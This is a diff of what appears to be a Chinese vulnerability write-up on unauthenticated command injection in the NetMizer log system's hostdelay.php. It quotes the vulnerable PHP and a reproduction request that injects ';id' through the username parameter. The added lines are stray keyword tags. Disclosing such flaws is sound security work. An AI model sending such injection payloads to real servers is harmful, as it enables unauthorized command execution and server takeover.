@@ -8,6 +8,8 @@ asset_dir: embedded-base64
 
 NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/chart/hostdelay.php` 文件存在[命令执行](https://mrxn.net/tag/rce "标签：命令执行")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。
 
+计算机安全
+
 # 影响版本
 
 老旧版本
@@ -52,6 +54,14 @@ if($action == 'list'){  // do by c
 //echo "$cmd\n";
         $fp=@popen($cmd, "r");
 ```
+
+深入探索
+
+编程
+
+计算机服务器
+
+网络安全
 
 `$nodeid`, `$iplist`, `$username`, `$sorttype` 这些参数均未经过过滤或转义就直接插入命令字符串中，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
@@ -99,6 +109,8 @@ else if($action == 'detail'){  // do by C
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
+
+网络
 
 ```
 GET /data/chart/hostdelay.php?action=list&username=;id HTTP/1.1
